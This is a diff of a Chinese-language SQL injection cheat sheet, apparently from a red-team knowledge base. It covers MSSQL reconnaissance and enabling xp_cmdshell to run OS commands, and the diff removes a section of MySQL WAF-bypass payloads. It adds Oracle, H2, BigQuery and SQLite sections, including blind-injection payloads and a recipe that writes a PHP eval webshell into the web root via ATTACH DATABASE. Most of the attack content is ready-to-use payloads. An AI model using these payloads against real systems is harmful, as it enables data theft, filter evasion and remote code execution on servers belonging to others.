+### MSSQL 基础
 
 **基本参数**
 ```sql
-@@version       // 数据库版本
-user            // 获取当前数据库用户名
-db_name()       // 当前数据库名 其中db_name(N)可以来遍历其他数据库
-;select user    // 查询是否支持多语句
-@@servername    // 服务器名称
+@@version       -- 数据库版本
+user            -- 获取当前数据库用户名
+db_name()       -- 当前数据库名 其中db_name(N)可以来遍历其他数据库
+;select user    -- 查询是否支持多语句
+@@servername    -- 服务器名称
 ```
 
-**正则表达式攻击**
+### 正则表达式攻击
 
-MSSQL所用的正则表达式并不是标准正则表达式 ，该表达式使用 like 关键词
+MSSQL 所用的正则表达式并不是标准正则表达式 ，该表达式使用 like 关键词
 ```sql
 1 AND 1=(SELECT TOP 1 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" and table_name LIKE '[a-z]%' )
 ```
@@ -643,7 +718,8 @@ MSSQL所用的正则表达式并不是标准正则表达式 ，该表达式使�
 
 同理可以用相同的方法获取字段，值。这里就不再详细描述了。
 
-**xp_cmdshell**
+### xp_cmdshell
+
 ```sql
 -- SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。
 
@@ -661,266 +737,7 @@ EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'user 
 exec master..xp_cmdshell 'cmd /c whoami'
 ```
 
----
-
-### Oracle
-
-> JSP 应用程序通常具有 Oracle 数据库。
-
----
-
-### H2 database
-
-**相关文章**
-- [一步一步教你漏洞挖掘之某系统从H2 database SQL注入漏洞到RCE回显构造](https://mp.weixin.qq.com/s/fZFNj2T0IITL8-9na_AWTQ)
-
----
-
-### BigQuery
-
-**相关文章**
-- [BigQuery SQL Injection Cheat Sheet](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)
-
-**Playground**
-- https://console.cloud.google.com/bigquery
-
-**信息收集**
-```
-SELECT * FROM INFORMATION_SCHEMA.SCHEMATA
-select @@project_id
-select session_user()
-```
-
----
-
-## 绕过技巧
-
-### MYSQL
-
-**相关文章**
-- [一次简单的waf绕过](https://mp.weixin.qq.com/s/YUhUMyEsP9rvezHmXEaR2g)
-
-**常见的绕过技巧**
-
-```bash
-# 双写
-❌ select
-✔ seselectlect
-
-# 大小写
-❌ select
-✔ SElect
-
-# 负数
-❌ ?id=1 ANd 1=1
-✔ ?id=1 ANd -1=-1
-
-# +号连接绕过
-❌ ?id=1 ANd 1=1
-✔ ?id=1+and+1=1
-✔ ?id=1+union+select+1+2
-
-# 无闭合
-❌ ?id=1 and 1=1
-✔ ?id=1 --+/*%0aand 1=1 --+*/
-
-# 有闭合
-❌ ?id=1 and 1=1
-✔ ?id=1 --+/*%0a'and 1=1 --+ --+*/
-✔ ?id=1 --+/*%0aand 1=1 --+*/
-✔ ?id=1 --+/*%0a'and 1=1 --+ --+*
-
-# %09、%0a、%0b、%0c、%0d、%a0 替换 %20
-❌ and false union select 1,2,......,31--
-✔ and%0afalse%0aunion%0aselect%0a1,2,......,31--+
-
-# URL 编码
-❌ ?id=1 union select pass from admin limit 1
-✔ 1%20union%20select%20pass%20from%20admin%20limit%201
-
-# Unicode 编码
-❌ ?id=1 union select pass from admin limit 1
-✔ ?id=1 union select pass from admin limit 1
-```
-
-**过滤函数**
-- 替换
-    ```sql
-    and length(database())=7
-    HAVING length(database())=7
-    ```
-
-- benchmark 代替 sleep
-    ```sql
-    id=1 and if(ascii(substring((database()),1,1))=115,(select benchmark(1000000,md5(0x41))),1) --+
-    ```
-
-- 字符串截取函数
-    ```sql
-    Mid(version(),1,1)
-    Substr(version(),1,1)
-    Substring(version(),1,1)
-    Lpad(version(),1,1)
-    Rpad(version(),1,1)
-    Left(version(),1)
-    reverse(right(reverse(version()),1)
-    ```
-
-- 字符串连接函数
-    ```sql
-    concat(version(),'|',user());
-    concat_ws('|',1,2,3)
-    ```
-
-- 字符转换/编码
-    ```
-    Char(49)
-    Hex(‘a’)
-    Unhex(61)
-    Ascii(1)
-    ```
-
-**过滤了逗号**
-- limit 处的逗号
-
-    ```
-    limit 1 offset 0
-    ```
-
-- 字符串截取处的逗号
-
-    ```
-    mid(version() from 1 for 1)
-    ```
-
-- union 处的逗号
-
-    通过 join 拼接.
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/33.jpg)
-
-**参数和 union 之间的位置**
-- `\Nunion` 的形式
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/9.jpg)
-
-- 浮点数的形式如 1.1,8.0
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/10.jpg)
-
-- 8e0 的形式
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/11.jpg)
-
-- 利用 `/*!50000*/` 的形式
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/12.jpg)
-
-**union 和 select 之前的位置**
-- 空白字符
-
-    Mysql 中可以利用的空白字符有:%09,%0a,%0b,%0c,%0d,%a0;
-
-- 注释
-
-    MYSQL中可以利用的空白字符有:
-    ```
-    /**/
-    /*letmetest*/
-    ```
-
-- 使用括号
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/13.jpg)
-
-**union select 后的位置**
-- 空白字符
-- 注释
-- 括号:select(1)from
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/14.jpg)
-
-- 减号:
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/15.jpg)
-
-- 加号:
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/16.jpg)
-
-- `~` 号:
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/17.jpg)
-
-- `!` 号:
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/18.jpg)
-
-- `@` 形式
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/19.jpg)
-
-- `*` 号,利用 /*!50000*/ 的形式
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/20.jpg)
-
-- 单引号和双引号:
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/21.jpg)
-
-- `{` 括号:
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/22.jpg)
-
-- `\N` 符号:
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/23.jpg)
-
-**select from 之间的位置**
-- 空白字符
-- 注释
-- ``
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/24.jpg)
-
-- `+,-,!,~,’"`
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/25.jpg)
-
-- `*` 号
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/26.jpg)
-
-- `{` 号
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/27.jpg)
-
-- `(` 号
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/28.jpg)
-
-**select from 之后的位置**
-- 空白字符
-- 注释
-- `` 号
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/29.jpg)
-
-- `*` 号
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/30.jpg)
-
-- `{` 号
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/31.jpg)
-
-- 括号
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/32.jpg)
-
----
-
-### sqlserver
+### bypass 技巧
 
 **select from 后的位置**
 - 空白符号
@@ -977,3 +794,108 @@ select session_user()
     使用 sp_executesql 的方式:
 
     ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/38.jpg)
+
+---
+
+## oracle
+
+**相关案例**
+- [BountyHunterInChina/重生之我是赏金猎人(一)-轻松GET某src soap注入](https://github.com/J0o1ey/BountyHunterInChina/blob/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA(%E4%B8%80)-%E8%BD%BB%E6%9D%BEGET%E6%9F%90src%20soap%E6%B3%A8%E5%85%A5.pdf)
+
+### bypass 技巧
+
+oracle 中文版中,中文括号 `（ ）`可以代理英文且不报错
+```
+select （1+1） from test;
+```
+
+---
+
+## H2 database
+
+**相关文章**
+- [一步一步教你漏洞挖掘之某系统从H2 database SQL注入漏洞到RCE回显构造](https://mp.weixin.qq.com/s/fZFNj2T0IITL8-9na_AWTQ)
+
+---
+
+## BigQuery
+
+**相关文章**
+- [BigQuery SQL Injection Cheat Sheet](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)
+
+**Playground**
+- https://console.cloud.google.com/bigquery
+
+**信息收集**
+```
+SELECT * FROM INFORMATION_SCHEMA.SCHEMATA
+select @@project_id
+select session_user()
+```
+
+---
+
+## SQLite
+
+SQLite 是一个进程内的库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。它是一个零配置的数据库，这意味着与其他数据库不一样，你不需要在系统中配置。
+
+SQLite 数据库的特点是它每一个数据库都是一个文件，当你查询表的完整信息时会得到创建表的语句。
+
+**相关文章**
+- [SQLite注入](https://mp.weixin.qq.com/s/12lN4zeezSsCLYvRYJfAuw)
+
+### SQLite 基础
+
+- https://www.runoob.com/sqlite/sqlite-commands.html
+
+**注释**
+
+```sql
+;       注释内容，表示单行注释
+--      注意--后面有一个空格
+/* */   多行注释
+```
+
+**查看版本**
+
+```sql
+select sqlite_version();
+```
+
+**查询表名和列名**
+
+```sql
+select sql from sqlite_master
+```
+
+**布尔盲注**
+
+布尔盲注通过查询正确和错误返回的页面不同来判断数据内容。
+
+SQLite不支持ascii，所以直接通过字符去查询，这里和mysql不同，这个区分大小写。也没有mid,left等函数。
+
+```sql
+-1' or substr((select group_concat(sql) from sqlite_master),1,1)<'a'/*
+```
+
+**时间盲注**
+
+SQLite没有sleep()函数，但可以用randomblob(N)函数，randomblob(N) 函数，其作用是返回一个 N 字节长的包含伪随机字节的 BLOG。N 是正整数。可以用它来制造延时。SQLite没有if，所以需要使用case……when来代替。
+
+```
+-1' or (case when(substr(sqlite_version(),1,1)>'3') then randomblob(300000000) else 0 end)/*
+```
+
+**写 webshell**
+
+SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的数据库，使用该命令后，所有的 SQLite 语句将在附加的数据库下执行。
+```
+ATTACH DATABASE file_name AS database_name;
+```
+
+如果附加数据库不存在，就会创建该数据库，如果数据库文件设置在web目录下，就可以写入webshell。
+```
+ATTACH DATABASE '/var/www/html/shell.php' AS shell;
+create TABLE shell.exp (webshell text);
+insert INTO shell.exp (webshell) VALUES ('<?php eval($_POST[a]);?>');
+```
